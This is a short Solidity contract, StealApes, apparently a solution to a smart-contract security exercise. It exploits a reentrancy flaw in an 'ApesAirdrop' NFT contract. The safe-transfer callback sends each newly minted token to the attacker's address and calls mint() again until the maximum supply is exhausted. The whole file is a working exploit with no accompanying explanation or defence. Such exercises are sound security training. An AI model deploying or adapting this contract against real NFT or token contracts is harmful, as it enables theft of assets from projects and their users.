// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IApesAirdrop {
    function mint() external returns (uint16);

    function transferFrom(address from, address to, uint256 tokenId) external;

    function maxSupply() external returns (uint16);
}

contract StealApes {
    IApesAirdrop apesAirdrop;
    address owner;

    constructor(address _addressApesAirdrop) {
        apesAirdrop = IApesAirdrop(_addressApesAirdrop);
        owner = msg.sender;
    }

    function attack() public {
        apesAirdrop.mint();
    }

    function onERC721Received(
        address _owner,
        address _from,
        uint256 _tokenId,
        bytes memory _data
    ) external returns (bytes4 retval) {
        apesAirdrop.transferFrom(address(this), owner, _tokenId);

        if (_tokenId < apesAirdrop.maxSupply()) {
            apesAirdrop.mint();
        }

        // return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        return StealApes.onERC721Received.selector;
    }
}
